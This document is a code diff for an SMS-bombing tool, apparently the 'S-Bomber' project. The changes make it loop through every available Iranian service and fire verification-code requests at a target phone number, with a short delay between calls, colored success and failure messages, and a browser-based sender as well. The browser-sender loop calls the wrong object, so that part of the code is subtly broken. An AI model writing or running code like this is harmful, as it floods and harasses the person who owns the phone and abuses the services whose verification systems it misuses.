@@ -6,7 +6,8 @@
 # ======== # Import part # ======== #  
 from os import name
 from shutil import move
-from lib import IranianSMS
+from time import sleep
+from lib import IranianSMS, bomb_exceptions
 from colorama import Fore
 from subprocess import run
 from pathlib import Path
@@ -61,14 +62,32 @@ else:
 
 # ========= # start to send sms # ========= #
 iranianSender = IranianSMS(target_Phone_Number)
-iranianSender.AllAtOnce()
 
+# ==== # running all the function inside iranianSender # ==== #
+# ==== # Its sends verification code from all the available services # ==== #
+for service in dict(iranianSender.__dict__).keys():
+    if '__' not in service:
+        try:
+            getattr(iranianSender, service)()
+        except ConnectionError:
+            print(Fore.RED + '[-] - '  + f'Couldn\'t send Verification code through {service}! Check Your Internet Connection.' + Fore.RESET)
+        except bomb_exceptions.BombClientError:
+            print(Fore.RED + '[-] - '  + f'Couldn\'t send Verification code through {service}! Contact Support If it Happened Constantly.' + Fore.RESET)
+        except bomb_exceptions.BombServerError:
+            print(Fore.RED + '[-] - '  + f'Couldn\'t send Verification code through {service}! There Is Problem with {service} server.' + Fore.RESET)
+        else:
+            print(Fore.YELLOW + '[+]' + Fore.MAGENTA + ' - ' + Fore.GREEN  + f'Verification code sent through {service} Successfully' + Fore.RESET)
+        sleep(1.6)
+            
+# ====== # Using browser to send SMS # ====== #
 try:
     from lib import IranianWebSMS
     web_irainan_sender = IranianWebSMS(target_Phone_Number)
-    web_irainan_sender.AllAtOnce()
+    for service in dict(iranianSender.__dict__).keys():
+        if '__' not in service:
+            getattr(iranianSender, service)()
 except ImportError:
     print(Fore.RED + 'A file ("WebDepend_Bomb.py") is missing. Couldn\'t send 11 message. Check github.com/ibehii/S-Bomber')
-    pass
+    
 except WebDriverException:
     print(Fore.RED + 'FireFox is not installed or webdriver is missing. Couldn\'t send 11 message. Check github.com/ibehii/S-Bomber')
